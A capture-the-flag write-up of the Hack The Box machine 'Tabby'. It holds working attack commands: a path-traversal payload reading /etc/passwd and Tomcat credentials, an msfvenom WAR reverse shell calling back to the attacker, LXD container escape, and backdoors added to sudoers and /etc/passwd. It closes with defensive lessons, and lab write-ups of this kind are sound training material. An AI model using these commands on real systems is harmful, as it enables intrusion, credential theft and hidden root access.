# Tabby Writeup w/o Metasploit

![Image for post](https://miro.medium.com/max/591/1*mh2clkXmiJxHT_y7hU2WxQ.png)

I presented this box at the [Hack The Box Ottawa August Meetup](https://www.meetup.com/Hack-The-Box-Meetup-Ottawa/events/272176003/). The presentation has been recorded and posted on [YouTube](https://www.youtube.com/watch?v=7QtJrMu5_YM).

Let’s get started!

## Reconnaissance <a id="41ed"></a>

Run [AutoRecon](https://github.com/Tib3rius/AutoRecon) to enumerate open ports and services running on those ports.

```text
sudo autorecon.py 10.10.10.194
```

View the full TCP port scan results.

```text
root@kali:~/# cat _full_tcp_nmap.txt
....
PORT     STATE SERVICE REASON         VERSION
22/tcp   open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http    syn-ack ttl 63 Apache httpd 2.4.41 ((Ubuntu))
|_http-favicon: Unknown favicon MD5: 338ABBB5EA8D80B9869555ECA253D49D
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Mega Hosting
8080/tcp open  http    syn-ack ttl 63 Apache Tomcat
| http-methods:                                                                                                                                                                
|_  Supported Methods: OPTIONS GET HEAD POST                                                                                                                                   
|_http-open-proxy: Proxy might be redirecting requests                                                                                                                         
|_http-title: Apache Tomcat
....
```

We have 3 ports open.

* **Port 22:** running OpenSSH 8.2p1
* **Port 80:** running Apache
* **Ports 8080:** running Apache Tomcat

Before we move on to enumeration, let’s make some mental notes about the scan results.

* The OpenSSH version that is running on port 22 is not associated with any critical vulnerabilities, so it’s unlikely that we gain initial access through this port, unless we find credentials.
* Port 8080 is running Apache Tomcat. We’ll have to check if we have access to the manager interface and test for default credentials. If we do get access to the application, we can simply deploy a war file that sends a reverse shell back to our attack machine.
* Port 80 is running a web server. AutoRecon by default runs gobuster and nikto scans on HTTP ports, so we’ll have to review them.

## Enumeration <a id="7f6f"></a>

We have two ports to enumerate: ports 80 & 8080.

**Port 8080: Apache Tomcat**

Visit the application in the browser.

![Image for post](https://miro.medium.com/max/1441/1*7jDJF1sWWqF3o5EgRCkT-A.png)

We can see that it is running Tomcat 9. Click on the _manager webapp_ link.

![Image for post](https://miro.medium.com/max/768/1*8qJfLLnajdjEclxIKblGUA.png)

We get prompted for credentials. At this stage we could test for default credentials. However, the Nikto scanner already does that and the default configuration of Autorecon runs a Nikto scan. Therefore, let’s view the nikto scan results.

```text
root@kali:~/# cat tcp_8080_http_nikto.txt 
- Nikto v2.1.6
--------------------------------------------------------------------
+ Target IP:          10.10.10.194
+ Target Hostname:    10.10.10.194
+ Target Port:        8080
+ Start Time:         2020-07-30 11:29:27 (GMT-4)
--------------------------------------------------------------------
+ Server: No banner retrieved
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Allowed HTTP Methods: GET, HEAD, POST, PUT, DELETE, OPTIONS 
+ OSVDB-397: HTTP method ('Allow' Header): 'PUT' method could allow clients to save files on the web server.
+ OSVDB-5646: HTTP method ('Allow' Header): 'DELETE' may allow clients to remove files on the web server.
+ /: Appears to be a default Apache Tomcat install.
+ /examples/servlets/index.html: Apache Tomcat default JSP pages present.
+ OSVDB-3720: /examples/jsp/snp/snoop.jsp: Displays information about page retrievals, including other users.
+ ERROR: Error limit (20) reached for host, giving up. Last error: opening stream: can't connect (timeout): Operation now in progress
+ Scan terminated:  20 error(s) and 9 item(s) reported on remote host
+ End Time:           2020-07-30 11:42:40 (GMT-4) (793 seconds)
--------------------------------------------------------------------
+ 1 host(s) tested
```

It didn’t report any default credentials. Before we attempt a brute force attack, let’s move on to enumerating the other port.

**Port 8080: Apache**

Visit the application in the browser.

![Image for post](https://miro.medium.com/max/1430/1*3LQ8Xfp4cBQmPLE_q-GCSw.png)

View page source to see if we get any extra information.

![Image for post](https://miro.medium.com/max/1183/1*e0pV0vkak6nM7SdzSyNq7Q.png)

We find a link to the _news.php_ page. Notice that the link does not contain the IP address but instead the domain name. Therefore, we need to add it to the _/etc/hosts_ file first.

```text
10.10.10.194 megahosting.htb
```

Visit the page.

![Image for post](https://miro.medium.com/max/1440/1*-7Wg0VGHnUsGaM91_38taQ.png)

We can see in the URL that a file with the name “_statement”_ is being called and executed to present the above page. So the first thing we should test for is local file inclusion \(LFI\). An LFI vulnerability occurs when an application uses the path to a file as user input. If the application does not properly validate that input, an attacker can use this vulnerability to include files locally present on the server.

Add the following string in the _file_ parameter of the URL.

```text
../../../../../etc/passwd
```

We get the content of the _passwd_ file! So it is definitely vulnerable to a LFI.

![Image for post](https://miro.medium.com/max/1176/1*aeb0yFXqLzAWd8LHa15xpQ.png)

## Initial Foothold <a id="447b"></a>

Let’s switch to Burp for further testing.

![Image for post](https://miro.medium.com/max/1321/1*nXjYh46b1DeJw10J7-j9UQ.png)

The next thing to test for is Remote File Inclusion \(RFI\). RFI is similar to LFI, except that it instead allows an attacker to include remote files. This is way more dangerous than an LFI. There are several methods you can try to turn an LFI to an RFI. I have documented them in detail in the [Poison writeup](https://medium.com/swlh/hack-the-box-poison-writeup-w-o-metasploit-a6acfdf52ac5). For this blog, I will test it using the PHP http:// wrapper.

First, start a simple python server on the attack machine.

```text
python -m SimpleHTTPServer 5555
```

Second, attempt to run a file hosted on the server.

![Image for post](https://miro.medium.com/max/1255/1*G2MBRIcjJkDQxMFcjsT4mA.png)

We can see that there was no attempt to download the file.

![Image for post](https://miro.medium.com/max/675/1*1b_syKVxFpverkHEy_IU9A.png)

So it’s not likely to be vulnerable to RFI. Therefore, let’s focus on the LFI vulnerability. The [PayloadsAllTheThings repository on GitHub](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion/Intruders) has a list of LFI payloads that you could try to potentially get useful information about the box the web server is running on. However, the first thing I would like to see is the source code of the _news.php_ script to determine what caused the LFI vulnerability.

If we simply try adding “_news.php_” in the file parameter, we get nothing indicating that the script is not placed in the current directory. Next, let’s try the parent of the current directory.

![Image for post](https://miro.medium.com/max/1976/1*OpqG9narJGkSaa2zbHV1pg.png)

We get the source code! Let’s do a quick code review.

* **Line 10:** Takes in the content of the file URL parameter and saves it in the $file parameter.
* **Line 11:** Takes in the content of the $file parameter, appends it to the directory _files_ and attempts to open the file at that location.
* **Lines 12–14:** Output the content of the file.

The LFI vulnerability is introduced in Line 11 since the $file parameter is a user-controlled input that is not sanitized. Discovering the reason behind the vulnerability is a bit of a detour from solving the box, however, it is important to understand why things work the way they do.

Going back, how can we use the LFI vulnerability to get code execution on the box? Well, when we visited the Tomcat server running on port 8080, it gave us the location of the _tomcat-users.xml_ file. Depending on the configuration, this file could contain the list of user names, roles, and passwords.

![Image for post](https://miro.medium.com/max/1363/1*KSle0L9Ga0_pKYXe4hx0bA.png)

Let’s use the LFI vulnerability to output the content of the file.

![Image for post](https://miro.medium.com/max/1235/1*iQig_lI8x5wvTJwv2k4inw.png)

This outputs nothing which leads us to believe that the file is in a different location. From the nmap scans, we do know that the OS is Ubuntu and the version of Tomcat installed is version 9. We also know that the Apache version is 2.4.41. So let’s try to use all that information to narrow down the exact Ubuntu release.

Googling “Apache 2.4.41 ubuntu”, leads us to [this page](https://packages.ubuntu.com/search?keywords=apache2). The only packages that support 2.4.41 are [eoan \(19.10\)](https://packages.ubuntu.com/eoan/apache2) and [focal \(20.04LTS\)](https://packages.ubuntu.com/focal/apache2). Let’s go with eoan \(you’ll arrive to the same result if you choose focal\). Googling “eoan tomcat9”, leads us to [this page](https://packages.ubuntu.com/eoan/tomcat9). Scroll down and click on [list of files](https://packages.ubuntu.com/eoan/all/tomcat9/filelist). From there, we see that the location of the _tomcat-users.xml_ file is as follows.

```text
/usr/share/tomcat9/etc/tomcat-users.xml
```

Use the above location to output the content of the file.

![Image for post](https://miro.medium.com/max/2538/1*NCz6J7-aqJFlV98_PoLNJw.png)

As can be seen in the above figure, there’s a user with the username “tomcat” and the password “$3cureP4s5w0rd123!”. The user also has the roles “admin-gui,manager-script”. Looking at the tomcat documentation, the following are the descriptions of the roles:

* **admin-gui:** gives the user the ability to configure the Host Manager application using the graphical web interface.
* **manager-script:** gives the user the ability to configure the Manager application using the text interface instead of the graphical web interface.

Therefore, if we try to log into the manager interface using the GUI, it won’t work. Instead, we’ll have to do it using the command line.

Before we do that, let’s first generate a war file that contains a reverse shell.

```text
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.12 LPORT=53 -f war > rkhal101.war
```

Next, use curl to upload the war file to the tomcat manager interface.

```text
curl -u "tomcat:\$3cureP4s5w0rd123!" --upload-file rkhal101.war http://10.10.10.194:8080/manager/text/deploy?path=/rkhal101
```

* **-u:** username:password
* **— upload-file:** the path to the file to upload

The URL to deploy the file can be found on the official [tomcat documentation](https://tomcat.apache.org/tomcat-9.0-doc/manager-howto.html#Deploy_A_New_Application_Archive_%28WAR%29_Remotely). Note that we had to escape the $ sign in the password for the password to be interpreted correctly.

The above command gives us a success message.

```text
OK - Deployed application at context path [/rkhal101]
```

We can also see the list applications using the following command.

```text
curl -u "tomcat:\$3cureP4s5w0rd123!" http://10.10.10.194:8080/manager/text/list
```

Next, setup a listener to receive the reverse shell.

```text
sudo nc -nlvp 53
```

Then call the deployed war file.

```text
curl http://10.10.10.194:8080/rkhal101/
```

We get a shell!

![Image for post](https://miro.medium.com/max/1036/1*CWiY-OCjhkTm7t5tq3-DuA.png)

Let’s upgrade it to a better shell.

```text
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

This gives us a partially interactive bash shell. To get a fully interactive shell, background the session \(CTRL+ Z\) and run the following in your terminal which tells your terminal to pass keyboard shortcuts to the shell.

```text
stty raw -echo
```

Once that is done, run the command “_fg_” to bring netcat back to the foreground. Then use the following command to give the shell the ability to clear the screen.

```text
export TERM=xterm
```

Unfortunately, we’re running as the _tomcat_ user and we don’t have privileges to view the _user.txt_ flag. Therefore, we need to escalate our privileges.

## **Privilege Escalation** <a id="5805"></a>

The first thing to do when you get initial access on the box is to enumerate the filesystem to see if there are any cleartext passwords. While doing that, we find a backup file that is encrypted.

```text
tomcat@tabby:/var/www/html/files$ unzip 16162020_backup.zip Archive:  16162020_backup.zip
checkdir error:  cannot create var
                 Read-only file system
                 unable to process var/www/html/assets/.
[16162020_backup.zip] var/www/html/favicon.ico password:
```

The fact that it is password protected means that it contains sensitive information. So let’s transfer the file back to our attack machine.

Setup a python server on the target machine.

```text
python3 -m http.server 5555
```

Then download the zip file on the attack machine.

```text
wget http://10.10.10.194:5555/16162020_backup.zip
```

Use fcrackzip to crack the password.

```text
rana@kali:~/Desktop/htb/tabby/user$ fcrackzip -D -p /usr/share/wordlists/rockyou.txt 16162020_backup.zip possible pw found: admin@it ()
```

It discovers the password! Use it to unzip the file.

```text
unzip 16162020_backup.zip
```

Going through the content of the files, we don’t find anything useful. However, we do have a new password. So let’s see if it was reused anywhere on the target system. First, let’s try to su into the ash user.

```text
tomcat@tabby:/var/lib/tomcat9$ su ash
Password: 
ash@tabby:/var/lib/tomcat9$ whoami
ash
```

It works, we’re now running as _ash_. Let’s view the _user.txt_ file.

![Image for post](https://miro.medium.com/max/914/1*QHIWHXWgWI1w00MDZ6mdNQ.png)

Now we need to escalate our privileges to root. Let’s view the groups that the user is a part of.

```text
sh@tabby:~$ id
uid=1000(ash) gid=1000(ash) groups=1000(ash),4(adm),24(cdrom),30(dip),46(plugdev),116(lxd)
```

The _lxd_ group is particularly interesting. LXD is Ubuntu’s system container manager. This is similar to virtual machines, however, instead using linux containers. As described in [this link](https://reboare.github.io/lxd/lxd-escape.html), the lxd group should be considered harmful in the same way the [docker](https://www.andreas-jung.com/contents/on-docker-security-docker-group-considered-harmful) group is. Any member of the lxd group can immediately escalate their privileges to root on the host operating system.

This in itself is not a bug, but intended functionality as described in this [link](https://materials.rangeforce.com/tutorial/2019/12/07/Privilege-Escalation-Docker-LXD-Groups/).

![Image for post](https://miro.medium.com/max/1724/1*DAXwH9lcDDObaaZNm_yKvQ.png)

There are several ways to exploit this functionality and escalate privileges to root. We’ll do it by mounting the /root filesystem to the container. To do that, we’ll use the “_Exploiting without internet — Method 2_” instructions in [this link](https://book.hacktricks.xyz/linux-unix/privilege-escalation/interesting-groups-linux-pe/lxd-privilege-escalation).

First, download and build a linux alpine image on the attack machine.

```text
git clone https://github.com/saghul/lxd-alpine-builder
cd lxd-alpine-builder/
sudo bash build-alpine
```

Second, transfer the image to the target machine. This can be done by starting a python server on the attack machine.

```text
python -m SimpleHTTPServer 6666
```

Then download the archived file in the _ash_ directory of the target machine.

```text
wget http://10.10.10.194:6666/alpine-v3.12-x86_64-20200826_2058.tar.gz
```

Third, import the image into lxc.

```text
lxc image import ./alpine-v3.12-x86_64-20200826_2058.tar.gz --alias rkhal101
```

**Note:** If you get the following error, run the “lxd init” command and accept all the default configurations. Then rerun the command to import the image into lxc.

![Image for post](https://miro.medium.com/max/1554/1*7VCHnxW4LbV3m-qvZKgIRg.png)

To view the list of images, run the following command.

```text
lxc image list
```

Fourth, run the image.

```text
lxc init rkhal101 rkhal101-container -c security.privileged=true
```

Fifth, mount the the / host directory into the image.

```text
lxc config device add rkhal101-container rkhal101-device disk source=/ path=/mnt/root recursive=true
```

The above command mounts the / host directory into the /mnt/root directory of the container.

Finally, start the container and run a bash shell.

```text
lxc start rkhal101-container
lxc exec rkhal101-container /bin/sh
```

Now we’re running as root in the alpine container \(_NOT_ the host OS\).

![Image for post](https://miro.medium.com/max/914/1*eugdbqqFzC44wzs0NXzMfw.png)

However, we mounted the host “/” directory to the directory “/mnt/root” in the alpine container. So if we visit “/mnt/root”, we can see the content of the “/” directory of the host OS.

![Image for post](https://miro.medium.com/max/1054/1*oK-jF_xpUyLNQdUgzKsh6A.png)

Therefore, we can view the _root.txt_ flag.

![Image for post](https://miro.medium.com/max/856/1*7JzHsycMw4kESSffRqKF3w.png)

Now although we can view the root flag, we’re not done yet! We’re currently root in the container, not the host OS. To truly escalate privileges, we need to escalate privileges on the host OS. There’s about a million ways to do that.

In this blog, we’ll escalate privileges in two ways.

### Way \#1: Enable sudo without password <a id="a152"></a>

In the _/etc/sudoers_ \(in the _/mnt/root_ directory\) file add the following line.

```text
echo "ash     ALL=(ALL) NOPASSWD:ALL" >> etc/sudoers
```

This will allow the ash user to run the sudo command without having to enter a password.

We’ll test this out after we complete way \#2.

### Way \#2: Add an entry in the /etc/passwd file <a id="17c9"></a>

The _/etc/passwd_ file historically contained user password hashes. For backwards compatibility, if the second field of a user row in _/etc/passwd_ contains a password hash, it takes precedent over the hash in _/etc/shadow_. Therefore, we can create a new user and assign them the root user ID \(0\) giving the user root privileges.

Now you might be asking, why not just add an entry or crack an existing password in the /etc/shadow file? You can definitely do that. I wanted to use the /etc/passwd file because not many people are familiar with the backward compatibility feature and therefore don’t check if the file has been misconfigured \(world-writeable\) in a way that would allow privilege escalation.

First, generate a password hash for the password “password” using openssl on the attack machine.

```text
rana@kali:~$ openssl passwd "password"
icmqBaqZ.ZbBU
```

Next, add the following entry to the /etc/passwd file.

```text
echo "root2:icmqBaqZ.ZbBU:0:0:root:/root:/bin/bash" >> etc/passwd
```

Now, if we su into root2 with the set password, we should have root privileges.

Let’s test if our privilege escalation techniques were successful.

First, exit the container using the following command.

```text
/mnt/root # exitash@tabby:~$ whoami
ash
```

To test privilege escalation way \#1, try to run the sudo command.

```text
ash@tabby:~$ sudo cat /etc/shadow
root:[redacted]:18429:0:99999:7:::
daemon:*:18375:0:99999:7:::
bin:*:18375:0:99999:7:::
sys:*:18375:0:99999:7:::
sync:*:18375:0:99999:7:::
games:*:18375:0:99999:7:::
man:*:18375:0:99999:7:::
```

As seen in the above listing, we were allowed to run a privileged command without having to enter a password. So way \#1 was successful.

To test privilege escalation way \#2, try to switch to the root2 user using the password “password”.

```text
ash@tabby:~$ su root2
Password: 
root@tabby:/home/ash#
```

As seen in the above listing, we were able to switch into the root2 user who has root privileges. So way \#2 was also successful!

## Lessons Learned <a id="3bd6"></a>

To gain an initial foothold on the box, we exploited one vulnerability:

1. A Local File Inclusion \(LFI\) vulnerability that allowed us to view files on the host. Using this vulnerability, we were able to view the tomcat-users.xml file which gave us access to the Tomcat Manager interface. This could have been easily avoided if the developer properly validated user input.

To escalate privileges on the box, we exploited three vulnerabilities:

1. Use of a weak password. The backup zip file was password protected with a weak password that we were able to crack in a matter of seconds. The user should have used a sufficiently long password that is not easily crackable.
2. Reuse of passwords. The password we obtained from cracking the backup zip file, was reused to horizontally escalate our privileges to the ash user. The user should have instead used a different strong password for his system account.
3. User part of the LXD group. This technically in itself is not technically a vulnerability but an intended functionality. What likely happened, is that this user previously had some form of admin privileges \(part of the sudo group\) on the system and so when LXD was installed it automatically added that user to the LXD group. However, when these privileges were stripped away from the user to make him a less privileged user, the user remained as part of the lxd group. This is why when it was [reported](https://github.com/lxc/lxd/issues/3844) as a vulnerability, the issue was closed cancelled. The obvious fix to this problem, would be to remove the user from the LXD group.

